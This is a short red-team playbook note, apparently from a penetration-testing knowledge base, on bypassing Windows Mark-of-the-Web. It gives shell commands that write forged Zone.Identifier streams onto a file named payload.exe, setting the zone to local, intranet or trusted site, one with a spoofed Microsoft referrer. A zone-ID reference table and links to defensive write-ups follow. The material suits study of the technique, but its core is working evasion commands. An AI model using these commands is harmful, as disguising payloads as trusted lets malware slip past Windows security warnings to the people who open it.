---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - defense-evasion
  - scenarios
  - windows
---
# 03 - Spoof ZoneTransfer (MOTW Bypass)

```
$ echo -e "[ZoneTransfer]\nZoneId=0" > /mnt/ntfs/payload.exe:Zone.Identifer

$ echo -e "[ZoneTransfer]\nZoneId=1" > /mnt/ntfs/payload.exe:Zone.Identifer

$ echo -e "[ZoneTransfer]\nZoneId=2\nReferrerUrl=https://learn.microsoft.com\nHostUrl=https://download.sysinternals.com/files/PsExec.exe" > /mnt/ntfs/payload.exe:Zone.Identifer
```

Unmount the container.

```
$ sudo umount /mnt/ntfs/
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/10 - Hidden Artifacts/Hide Artifacts/Windows/Steganography/Hide Files/ADS/Living off the Land|Windows: Hide Artifacts]]

- [Red Canary: Mark-of-the-Web Bypass](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/)

- [SecurityLiterate.com: How Malware Abuses the Zone Identifier to Circumvent Detection and Analysis](https://securityliterate.com/how-malware-abuses-the-zone-identifier-to-circumvent-detection-and-analysis/)

### Table Reference

| Zone Identifier | Description                                                                                                           |
| :-------------: | --------------------------------------------------------------------------------------------------------------------- |
|        0        | File originates from the local machine. It has the least security restriction.                                        |
|        1        | File originated from the local intranet (local network). Both zone identifier 0 and 1 indicate a high level of trust. |
|        2        | Indicates the file was downloaded from a trusted site. This can spoofed by attackers by manipulating the ADS.         |
|        3        | Indicates the file was downloaded from the internet and it is generally untrusted.                                    |
|        4        | Indicates that the file came from a likely unsafe source.                                                             |
